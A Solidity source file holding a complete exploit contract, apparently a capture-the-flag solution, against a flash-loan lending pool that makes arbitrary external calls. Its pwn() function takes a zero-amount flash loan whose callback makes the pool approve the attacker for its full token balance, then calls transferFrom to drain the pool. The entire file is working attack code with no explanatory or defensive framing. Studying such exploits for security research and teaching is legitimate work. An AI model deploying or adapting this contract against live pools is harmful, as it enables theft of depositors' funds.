// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint256 amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    function balanceOf(address) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract LendingPoolExploit {
    ILendingPool public pool;
    ILendingPoolToken public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    function pwn() external {
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                balance
            )
        );
        token.transferFrom(address(pool), address(this), balance);
    }
}
